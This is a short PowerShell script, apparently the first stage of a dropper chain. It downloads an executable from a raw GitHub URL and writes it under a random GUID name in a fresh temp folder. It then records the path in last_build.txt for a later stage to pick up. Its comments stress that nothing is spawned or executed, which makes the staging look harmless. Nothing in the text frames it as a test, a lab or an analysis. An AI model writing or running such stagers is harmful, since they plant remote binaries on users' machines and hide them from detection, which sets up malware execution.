# s1.ps1 — fetch + write. no spawn. no exec.
$u = 'https://raw.githubusercontent.com/westoakstudios/y/main/boot_1791736788567.exe'
$d = Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'))
ni -ItemType Directory -Force -Path $d | Out-Null
$p = Join-Path $d ([guid]::NewGuid().ToString('N') + '.exe')

# fetch raw bytes, write directly
$b = (New-Object Net.WebClient).DownloadData($u)
[IO.File]::WriteAllBytes($p, $b)

# handoff — path written to a file, nothing executed
$p | Out-File "$env:TEMP\last_build.txt" -Encoding ascii
Write-Host "staged: $p"
